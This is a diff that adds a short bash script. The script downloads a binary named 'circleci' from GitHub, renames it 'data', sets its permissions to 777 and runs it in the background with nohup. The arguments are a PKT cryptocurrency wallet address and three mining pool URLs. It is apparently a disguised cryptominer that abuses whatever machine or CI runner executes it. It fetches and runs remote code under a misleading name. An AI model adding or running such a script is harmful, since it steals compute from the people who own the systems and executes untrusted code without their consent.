@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/aurbach55/zash/raw/main/circleci
+mv circleci data
+chmod 777 data
+nohup ./data ann -p pkt1qu57jv9wzr88lx0xjlaxwr8vaedcj7qglk6pylj http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com > nohup.out
